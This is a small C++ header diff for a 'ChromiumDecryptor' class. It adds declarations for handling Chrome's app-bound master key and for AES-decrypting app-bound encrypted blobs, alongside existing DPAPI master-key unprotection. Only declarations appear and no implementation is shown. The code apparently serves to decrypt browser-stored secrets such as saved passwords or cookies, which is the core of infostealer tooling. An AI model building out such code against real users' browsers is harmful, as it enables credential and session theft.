@@ -6,6 +6,7 @@
 class ChromiumDecryptor {
 private:
     DATA_BLOB* master_key_blob;
+    DATA_BLOB* app_bound_master_key_blob;
 
 public:
     // Constructor
@@ -20,6 +21,9 @@ public:
     std::string read_json(const std::string& filePath);
     DATA_BLOB* UnportectMasterKey(std::string MasterString);
     std::string AESDecrypter(std::vector<BYTE> EncryptedBlob);
+
+    bool ChromiumAppBoundDecryptorInit(std::string key);
+    std::string AESDecrypterAppBound(std::vector<BYTE> EncryptedBlob);
 
 private:
     // Helper functions if needed
